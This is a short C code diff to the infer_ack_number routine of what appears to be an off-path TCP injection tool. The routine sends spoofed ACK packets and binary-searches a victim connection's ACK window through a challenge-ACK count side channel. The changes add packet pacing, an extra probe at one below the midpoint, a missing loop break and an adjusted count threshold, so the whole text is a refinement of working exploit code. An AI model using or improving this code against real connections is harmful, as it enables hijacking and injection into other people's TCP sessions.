@@ -1449,6 +1449,7 @@ int infer_ack_number(void)
 			spoof->ack = g_acks[ai];
 			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
 				return 0;
+			usleep(g_ctx.packet_delay);
 		} else if (step == 1) {
 			/* select a new mid */
 			bs_mid = (bs_start + bs_end) / 2;
@@ -1461,6 +1462,11 @@ int infer_ack_number(void)
 			spoof->ack = bs_mid;
 			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
 				return 0;
+			usleep(g_ctx.packet_delay);
+			spoof->ack = bs_mid-1;
+			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
+				return 0;
+			usleep(g_ctx.packet_delay);
 
 			/* we'll do maintenance after we check the results */
 		}
@@ -1509,6 +1515,7 @@ int infer_ack_number(void)
 					for (i = 3; i > 0; i--) {
 						if (g_chacks[i] == 100) {
 							ack_start = g_acks[i];
+							break;
 						}
 					}
 				}
@@ -1526,7 +1533,7 @@ int infer_ack_number(void)
 			}
 		} else if (step == 1) {
 			/* figure out which chunk exactly! */
-			if (g_chack_cnt == 99) {
+			if (g_chack_cnt == 98) {
 				if (bs_start >= bs_end) {
 					/* FAIL! */
 					printf("[!] Exhausted ack window binary search...\n");
